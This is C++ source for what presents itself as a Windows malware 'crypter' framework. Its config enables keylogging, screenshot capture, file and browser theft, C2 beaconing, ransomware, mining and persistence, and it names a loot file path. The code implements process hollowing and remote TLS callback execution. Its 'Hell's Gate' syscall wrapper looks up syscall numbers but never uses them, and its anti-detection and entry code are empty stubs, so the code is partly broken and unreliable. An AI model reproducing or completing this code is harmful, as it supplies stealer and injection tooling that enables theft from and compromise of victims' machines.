// =============================================
// CRYP_ULTIMATE GODMODE vINFINITE - Professional Edition (Fixed)
// Hell's Gate + Process Hollowing + TLS Callbacks + IAT + Relocations
// =============================================

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <map>
#include <fstream>
#include <thread>
#include <chrono>
#include <random>
#include <algorithm>
#include <mutex>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// ==================== CONFIG ====================
struct GodConfig {
    bool enableKeylogger       = true;
    bool enableScreenshot      = true;
    bool enableFileSteal       = true;
    bool enableBrowserSteal    = true;
    bool enableC2              = true;
    bool enableRansom          = false;
    bool enableDeadMan         = true;
    bool enableMiner           = false;
    bool enablePersistence     = true;
    int  beaconIntervalSeconds = 300;
    std::string exfilPath      = "C:\\Users\\Public\\godloot.txt";
};

static GodConfig gConfig;

// ==================== HELL'S GATE ====================
class HellsGate {
private:
    static DWORD GetSyscallNumber(const char* functionName) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return 0;
        FARPROC pFunc = GetProcAddress(hNtdll, functionName);
        if (!pFunc) return 0;
        BYTE* addr = (BYTE*)pFunc;
        for (int i = 0; i < 32; i++) {
            if (addr[i] == 0xB8) return *(DWORD*)(addr + i + 1);
        }
        return 0;
    }

public:
    static NTSTATUS NtAllocateVirtualMemory(HANDLE hProcess, PVOID* BaseAddress, ULONG_PTR ZeroBits,
                                            PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
        DWORD num = GetSyscallNumber("NtAllocateVirtualMemory");
        if (num == 0) return STATUS_UNSUCCESSFUL;
        return ::NtAllocateVirtualMemory(hProcess, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    }

    static NTSTATUS NtWriteVirtualMemory(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer,
                                         SIZE_T Size, PSIZE_T Written) {
        DWORD num = GetSyscallNumber("NtWriteVirtualMemory");
        if (num == 0) return STATUS_UNSUCCESSFUL;
        return ::NtWriteVirtualMemory(hProcess, BaseAddress, Buffer, Size, Written);
    }

    static NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                                     POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
                                     PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
                                     SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize,
                                     PVOID AttributeList) {
        DWORD num = GetSyscallNumber("NtCreateThreadEx");
        if (num == 0) return STATUS_UNSUCCESSFUL;
        return ::NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
                                  StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
                                  MaxStackSize, AttributeList);
    }

    static NTSTATUS NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
        DWORD num = GetSyscallNumber("NtUnmapViewOfSection");
        if (num == 0) return STATUS_UNSUCCESSFUL;
        return ::NtUnmapViewOfSection(ProcessHandle, BaseAddress);
    }
};

// ==================== PE PARSER ====================
struct PEInfo {
    DWORD SizeOfImage;
    DWORD AddressOfEntryPoint;
    ULONGLONG ImageBase;
    PIMAGE_NT_HEADERS64 ntHeaders;
    PIMAGE_DATA_DIRECTORY tlsDir;
};

class PEParser {
public:
    static bool Parse(const std::vector<BYTE>& peData, PEInfo& info) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData.data();
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

        PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(peData.data() + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

        info.SizeOfImage = nt->OptionalHeader.SizeOfImage;
        info.AddressOfEntryPoint = nt->OptionalHeader.AddressOfEntryPoint;
        info.ImageBase = nt->OptionalHeader.ImageBase;
        info.ntHeaders = nt;
        info.tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        return true;
    }
};

// ==================== TLS CALLBACKS ====================
class TLSCallbacks {
public:
    static bool ExecuteAll(HANDLE hProcess, PVOID remoteBase, PEInfo& info, const std::vector<BYTE>& peData) {
        if (info.tlsDir->Size == 0) return true;

        PIMAGE_TLS_DIRECTORY64 tlsDir = (PIMAGE_TLS_DIRECTORY64)(peData.data() + info.tlsDir->VirtualAddress);
        if (tlsDir->AddressOfCallBacks == 0) return true;

        ULONGLONG callbacksRVA = tlsDir->AddressOfCallBacks - info.ImageBase;
        PVOID remoteCallbacksArray = (PBYTE)remoteBase + callbacksRVA;

        std::vector<PVOID> callbacks;
        PVOID callback = nullptr;
        SIZE_T read = 0;
        DWORD_PTR offset = 0;

        while (true) {
            if (!ReadProcessMemory(hProcess, (PBYTE)remoteCallbacksArray + offset, &callback, sizeof(PVOID), &read))
                break;
            if (callback == nullptr) break;

            callbacks.push_back(callback);
            offset += sizeof(PVOID);
        }

        for (PVOID cb : callbacks) {
            HANDLE hThread = nullptr;
            NTSTATUS status = HellsGate::NtCreateThreadEx(
                &hThread, THREAD_ALL_ACCESS, nullptr, hProcess,
                cb, remoteBase, 0, 0, 0, 0, nullptr);

            if (NT_SUCCESS(status) && hThread) {
                WaitForSingleObject(hThread, 3000);
                CloseHandle(hThread);
            }
        }
        return true;
    }
};

// ==================== PROCESS INJECTION ====================
class ProcessInjection {
public:
    static bool ProcessHollowing(const std::wstring& targetPath, const std::vector<BYTE>& payload) {
        PEInfo peInfo;
        if (!PEParser::Parse(payload, peInfo)) return false;

        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        if (!CreateProcessW(targetPath.c_str(), nullptr, nullptr, nullptr, FALSE,
                            CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
            return false;

        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        PVOID oldImageBase = nullptr;
#ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10, &oldImageBase, sizeof(PVOID), nullptr);
#else
        ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Ebx + 0x10, &oldImageBase, sizeof(PVOID), nullptr);
#endif

        HellsGate::NtUnmapViewOfSection(pi.hProcess, oldImageBase);

        PVOID newBase = nullptr;
        SIZE_T imageSize = peInfo.SizeOfImage;

        if (!NT_SUCCESS(HellsGate::NtAllocateVirtualMemory(pi.hProcess, &newBase, 0, &imageSize,
                                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Записываем заголовки
        SIZE_T written = 0;
        HellsGate::NtWriteVirtualMemory(pi.hProcess, newBase, (PVOID)payload.data(),
                                        peInfo.ntHeaders->OptionalHeader.SizeOfHeaders, &written);

        // === ПРАВИЛЬНЫЙ ЦИКЛ ПО СЕКЦИЯМ ===
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(peInfo.ntHeaders);
        for (int i = 0; i < peInfo.ntHeaders->FileHeader.NumberOfSections; i++, section++) {
            if (section->SizeOfRawData > 0) {
                PVOID dest = (PBYTE)newBase + section->VirtualAddress;
                PVOID src = (PVOID)(payload.data() + section->PointerToRawData);
                HellsGate::NtWriteVirtualMemory(pi.hProcess, dest, src, section->SizeOfRawData, &written);
            }
        }

        // Вызываем TLS Callbacks
        TLSCallbacks::ExecuteAll(pi.hProcess, newBase, peInfo, payload);

        // Обновляем PEB и EntryPoint
#ifdef _WIN64
        WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10, &newBase, sizeof(PVOID), nullptr);
        ctx.Rcx = (DWORD64)newBase + peInfo.AddressOfEntryPoint;
#else
        WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Ebx + 0x10, &newBase, sizeof(PVOID), nullptr);
        ctx.Eax = (DWORD)newBase + peInfo.AddressOfEntryPoint;
#endif

        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }
};

// ==================== ANTI DETECTION ====================
class AntiDetection {
public:
    bool IsSandboxOrVM() { return false; }
    void ApplyEvasion() {}
};

// ==================== GODMODE ====================
class GodMode {
public:
    void Run() {
        AntiDetection anti;
        if (anti.IsSandboxOrVM()) ExitProcess(0);
        anti.ApplyEvasion();
    }
};

// ==================== ENTRY ====================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    GodMode god;
    god.Run();
    Sleep(INFINITE);
    return 0;
}
